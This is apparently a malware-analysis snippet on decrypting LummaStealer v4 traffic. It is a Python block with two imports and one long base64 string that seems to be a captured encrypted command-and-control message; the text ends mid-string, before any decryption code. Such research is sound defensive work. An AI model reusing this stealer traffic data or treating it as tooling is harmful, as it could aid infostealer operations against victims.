# LummaStealer v4 communication decryption proof

```python

import base64
import json

recive_message = "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